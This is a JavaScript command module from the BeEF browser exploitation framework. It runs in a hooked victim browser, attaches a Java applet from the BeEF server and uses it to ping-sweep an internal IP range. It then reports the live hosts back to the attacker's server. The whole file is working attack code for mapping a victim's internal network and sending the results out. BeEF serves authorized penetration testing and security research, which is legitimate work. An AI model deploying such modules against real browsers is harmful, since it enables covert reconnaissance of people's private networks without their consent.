//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


beef.execute(function() {

    var ipRange = "<%= @ipRange %>";
    var timeout = "<%= @timeout %>";
    var appletTimeout = 30;
    var output = "";
    var hostNumber = 0;
    var internal_counter = 0;
    var firstMsgSent = false;

    beef.dom.attachApplet('pingSweep', 'pingSweep', 'pingSweep', beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/", null, [{'ipRange':ipRange, 'timeout':timeout}]);

		function waituntilok() {
			try {
			    hostNumber = document.pingSweep.getHostsNumber();
                if(hostNumber != null && hostNumber > 0){
                    if(!firstMsgSent){
                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Applet attached.<br>Hosts to check: ' + hostNumber + '<br>Required time (s): ~' + (timeout * hostNumber)/1000);
                        firstMsgSent = true;
                    }
                    output = document.pingSweep.getAliveHosts();
                    clearTimeout(int_timeout);
                    clearTimeout(ext_timeout);
				    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Alive hosts:<br>'+output.replace(/\n/g,"<br>"), beef.are.status_success());
				    beef.dom.detachApplet('pingSweep');
				    return;
                }else{
                     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=No hosts to check', beef.are.status_error());
                     return;
                }
			} catch (e) {
				internal_counter++;
				if (internal_counter > appletTimeout) {
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'ps=Timeout after '+appletTimeout+' seconds');
					beef.dom.detachApplet('pingSweep');
					return;
				}
				int_timeout = setTimeout(function() {waituntilok()},1000);
			}
		}

		ext_timeout = setTimeout(function() {waituntilok()},5000);

});

